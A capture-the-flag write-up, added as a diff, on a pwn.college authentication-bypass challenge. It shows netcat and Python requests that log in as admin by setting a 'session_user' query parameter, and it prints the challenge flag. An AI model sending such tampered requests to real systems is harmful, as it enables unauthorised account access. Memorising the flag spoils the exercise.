@@ -1,0 +1,49 @@
+# challenge: authentication bypass 1
+
+📅 2026-01-29
+📁 web security
+
+---
+
+## ✅ what i did  
+I WAY -> netcat
+-clicked start
+-opened the terminal
+-ran: 'cat /challenge/server'
+found out the only endpoint available is /
+the code creates a database with one table which has 2 columns, username and password, with 2 records
+first record -> "admin" + random password
+second record -> "guest" + "password"
+once logged in the server creates a string query with session_user=[USERNAME]
+to bypass authentication (which is almost impossible cuz admin's password is random),
+we can craft the query string
+-ran: '/challenge/server'
+-ran: 'nc -v challenge.localhost 80'
+-typed: 'GET /?session_user=admin HTTP/1.1'
+        'Host: challenge.localhost'
+-flag popped out
+
+II WAY -> python
+-clicked start
+-opened the terminal
+-ran: 'vim bro'
+-typed: '#!/usr/bin/env python3'
+        'from pwn import *'
+        'import requests'
+        'context.log_level = 'error''
+        'p = process("/challenge/server")'
+        'time.sleep(1)'
+        'url = "http://challenge.localhost/?session_user=admin"'
+        'r = requests.get(url)'
+        'print(r.text)'
+-ran: 'chmod a+x bro'
+-ran: './bro'
+-flag popped out
+
+## 🧑🏾‍🏫 what this challenge teaches u
+SELECT -> select one record from table
+INSERT -> insert a record in the table
+rowid rappresents record's id
+
+## 🏁 Flag  
+pwn.college{oOf-JFcB8Y50AEqPwOnME7L9APf.QX5gzMzwCO4IDOxEzW}
